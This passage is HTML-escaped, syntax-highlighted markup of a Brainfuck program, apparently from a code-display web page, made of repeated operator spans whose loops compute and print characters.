operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span 